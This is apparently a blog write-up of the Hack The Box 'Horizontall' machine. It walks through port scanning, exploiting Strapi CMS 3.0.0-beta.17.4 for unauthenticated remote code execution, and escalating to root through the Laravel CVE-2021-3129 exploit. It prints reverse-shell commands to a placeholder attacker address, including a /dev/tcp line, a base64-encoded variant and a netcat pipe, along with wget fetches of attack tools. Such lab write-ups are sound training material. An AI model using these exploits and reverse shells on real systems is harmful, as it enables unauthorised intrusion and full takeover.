---
title: "horizontall"
author: am-a-circle
date: 2022-02-14 11:30:00 +0800
categories: [HTB,easyyy]
tags: [CVE]
math: false
mermaid: false
image:
  src: /assets/img/htb/horizontall/horizontall6.png
  width: 595
  height: 378
---

## Overview


|Box Difficulty| Link|
|--|--|
| Easy | [HTB](https://app.hackthebox.com/machines/Horizontall) |

## Recon


```bash
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# masscan -p1-65535,U:1-65535 10.10.11.105 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-01-06 06:10:59 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.11.105                                    
Discovered open port 80/tcp on 10.10.11.105   
```


Enumerate ports that were found to be open:
```bash
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# nmap -sVC -p 22,80 10.10.11.105                                                                                                                             
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-06 01:18 EST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: horizontall
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
```
Begin enumeration.

## HTTP- TCP 80

```bash
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# curl 10.10.11.105 -v
*   Trying 10.10.11.105:80...
* Connected to 10.10.11.105 (10.10.11.105) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.11.105
> User-Agent: curl/7.80.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.14.0 (Ubuntu)
< Date: Thu, 06 Jan 2022 06:17:21 GMT
< Content-Type: text/html
< Content-Length: 194
< Connection: keep-alive
< Location: http://horizontall.htb
< 
<html>
<head><title>301 Moved Permanently</title></head>
<body bgcolor="white">
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host 10.10.11.105 left intact
```

Add `horizontall.htb` to `/etc/hosts`

```bash
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# cat /etc/hosts       
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.105    horizontall.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Enumerate website, we can find a javascript file called `http://horizontall.htb/js/app.c68eb462.js` 

![enter image description here](https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/htb/horizontall/horizontall1.png?raw=true)
Copy to beautifier and beautify. 
We can find we see that the subdomain called, `http://api-prod.horizontall.htb/`

![enter image description here](https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/htb/horizontall/horizontall3.png?raw=true)
Add `api-prod.horizontall.htb` to `/etc/hosts`

```bash┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# cat /etc/hosts                  
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.105    horizontall.htb api-prod.horizontall.htb
```

Further enumerations shows `strapi`  CMS at `/admin`
```bash
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s "200,204,351,352,357,403,500" -x "txt,html,php,php.bak,bak,jsp" 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,php.bak,bak,jsp,txt,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/01/06 02:20:54 Starting gobuster in directory enumeration mode
===============================================================
http://api-prod.horizontall.htb/index.html           (Status: 200) [Size: 413]
http://api-prod.horizontall.htb/reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/users                (Status: 403) [Size: 60] 
http://api-prod.horizontall.htb/admin                (Status: 200) [Size: 854]
http://api-prod.horizontall.htb/Reviews              (Status: 200) [Size: 507]
http://api-prod.horizontall.htb/robots.txt           (Status: 200) [Size: 121]
```

![enter image description here](https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/htb/horizontall/horizontall4.png?raw=true)


## Shell as strapi
Looks like there are several known  exploit for strapi.
```bash
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# searchsploit strapi            
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                          |  Path
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                      | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                    | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                              | multiple/webapps/50239.py
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


We can see that the version is `3.0.0-beta.17.4` which matches `multiple/webapps/50239.py`.

```bash
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# curl api-prod.horizontall.htb/admin/init                                                                                      
{"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}
```    
 Let's run the exploit !                                    
```bash
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# locate 50239.py                                             
/usr/share/exploitdb/exploits/multiple/webapps/50239.py


┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNDU1Njk0LCJleHAiOjE2NDQwNDc2OTR9.1IlZN6UGnKntpUCHNT6ZZZlTnRv-NyiL3XOHHcC_etg


$> whoami
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
$> bash -i >& /dev/tcp/[YOURIPADDRESS]/4242 0>&1
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
$> echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC9bWU9VUklQQUREUkVTU10vNDI0MiAwPiYx' | base64 --decode | bash
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

On our local machine

```bash
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# nc -lvnp 4242                                   
listening on [any] 4242 ...
strapi@horizontall:~/myapi$ whoami;id;hostname
whoami;id;hostname
strapi
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
horizontall
```

## Shell as Root

After running linpeas, we can see that there are several port open on localmachine. e.g. `127.0.0.1:3306 ` and `127.0.0.1:8000`.

```bash
strapi@horizontall:/tmp$ wget http://[YOURIPADDRESS]:1235/linpeas.sh                                                                                                          
--2022-01-07 01:21:05--  http://[YOURIPADDRESS]:1235/linpeas.sh                                                                                                               
Connecting to [YOURIPADDRESS]:1235... connected.                                                                                                                              
HTTP request sent, awaiting response... 200 OK                                                                                                                            
Length: 330173 (322K) [text/x-sh]                                                                                                                                         
Saving to: ‘linpeas.sh’                                                                                                                                                   
                                                                                                                                                                          
linpeas.sh                                 100%[======================================================================================>] 322.43K  --.-KB/s    in 0.05s    
                                                                                                                                                                          
2022-01-07 01:21:05 (6.13 MB/s) - ‘linpeas.sh’ saved [330173/330173]                                                                                                      
                                                                                                                                                                          
strapi@horizontall:/tmp$ bash linpeas.sh
 
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1780/node /usr/bin/ 
tcp6       0      0 :::80                   :::*                    LISTEN      -                    
tcp6       0      0 :::22                   :::*                    LISTEN      -        
```
We can see that it runs `Laravel v8 (PHP v7.4.18)`.
```bash
strapi@horizontall:/tmp$ curl 127.0.0.1:8000                                                                                                                              
<!DOCTYPE html>                                                                                                                                                           
<html lang="en">                                                                                                                                                          
    <head>                          
…
..
…
                    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
                            Laravel v8 (PHP v7.4.18)
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
```
There is an exploit for that version. The exploit `CVE-2021-3129` affects all **Version: <= 8.4.2**.

```
┌──(root💀kali)-[/opt/HTB/Horizontall]
└─# searchsploit laravel                                                                                                                                         
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                          |  Path
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
...
Laravel 8.4.2 debug mode - Remote code execution                                                                                        | php/webapps/49424.py
...
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Unfortunately, 49424.py does not work for me!

```bash
strapi@horizontall:/tmp$ wget http://[YOURIPADDRESS]:1235/49424.py
--2022-01-07 01:52:42--  http://[YOURIPADDRESS]:1235/49424.py
Connecting to [YOURIPADDRESS]:1235... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4052 (4.0K) [text/plain]
Saving to: ‘49424.py’
 
49424.py                                   100%[======================================================================================>]   3.96K  --.-KB/s    in 0s      
 
2022-01-07 01:52:42 (22.1 MB/s) - ‘49424.py’ saved [4052/4052]
 
 
 strapi@horizontall:/tmp$ chmod +x 49424.py 

strapi@horizontall:/tmp$ python3 49424.py http://127.0.0.1:8000 /var/www/html/laravel/storage/logs/laravel.log 'id'
                                                                                                                                                                          
Exploit...                                                                         
strapi@horizontall:/tmp$
``` 

Used another exploit from : [https://github.com/nth347/CVE-2021-3129_exploit](https://github.com/nth347/CVE-2021-3129_exploit)

Also I donwload phpgcc on local machine and port over to victim machine. `git clone https://github.com/ambionics/phpggc.git`

```bash
strapi@horizontall:/tmp$ wget -r -np -R "index.html*" http://[YOURIPADDRESS]:1235/phpggc/ 

strapi@horizontall:/tmp$ wget http://[YOURIPADDRESS]:1235/exploit.py
--2022-01-07 02:04:09--  http://[YOURIPADDRESS]:1235/exploit.py
Connecting to [YOURIPADDRESS]:1235... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2935 (2.9K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                 100%[======================================================================================>]   2.87K  --.-KB/s    in 0s      

2022-01-07 02:04:09 (18.2 MB/s) - ‘exploit.py’ saved [2935/2935]

strapi@horizontall:/tmp$ chmod +x exploit.py 
strapi@horizontall:/tmp$ ./exploit.py http://localhost:8000 Monolog/RCE1 id
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```
To get a reverse shell:
```bash
strapi@horizontall:/tmp$ ./exploit.py http://localhost:8000 Monolog/RCE1 "nc [YOURIPADDRESS] 6666 | /bin/bash 2>&1 | nc [YOURIPADDRESS] 6667"
```
![enter image description here](https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/htb/horizontall/horizontall7.png?raw=true)
